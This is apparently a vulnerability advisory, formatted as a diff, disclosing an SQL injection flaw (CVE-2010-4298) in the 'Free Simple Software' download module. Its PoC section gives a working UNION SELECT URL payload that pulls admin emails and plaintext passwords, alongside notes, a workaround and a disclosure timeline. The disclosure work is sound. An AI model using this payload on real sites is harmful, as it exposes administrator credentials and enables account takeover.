@@ -1,0 +1,43 @@
+'Free Simple Software' SQL Injection Vulnerability (CVE-2010-4298)
+Mark Stanislav - mark.stanislav@gmail.com
+
+
+I. DESCRIPTION
+---------------------------------------
+A vulnerability exists in the 'Free Simple Software' download module which allows for a 'UNION SELECT' to easily expose the application administrator's plaintext password.
+
+ 
+II. TESTED VERSION
+---------------------------------------
+1.0 [Manual Install Version]
+
+
+III. PoC EXPLOIT
+---------------------------------------
+http://site.com/index.php?page=downloads&request=download_now&downloads_id=' UNION SELECT email_address as name, NULL, NULL, password as file_name, last_name as file_url from admin_users where id!='NULL
+
+
+IV. NOTES 
+---------------------------------------
+* User passwords for this web application are not encrypted or hashed which makes this exploit even more concerning.
+* The PoC assumes that the first user is the administrative user which is the default behavior for the application.
+* At least 1 download must already exist to enable this exploit.
+* Due to a previous vulnerability not being fixed 3-months after disclosure (CVE-2010-3307), it's assumable that this application is not being actively developed.
+
+
+V. SOLUTION
+---------------------------------------
+Do not utilize the download module. No patch/upgrade is available at this time.
+
+
+VI. REFERENCES
+---------------------------------------
+http://www.freesimplesoft.com/
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4298
+https://www.uncompiled.com/2010/11/free-simple-software-sql-injection-vulnerability-cve-2010-4298/
+
+
+VII. TIMELINE
+---------------------------------------
+11/12/2010: Initial disclosure e-mail to the vendor
+11/21/2010: Public disclosure
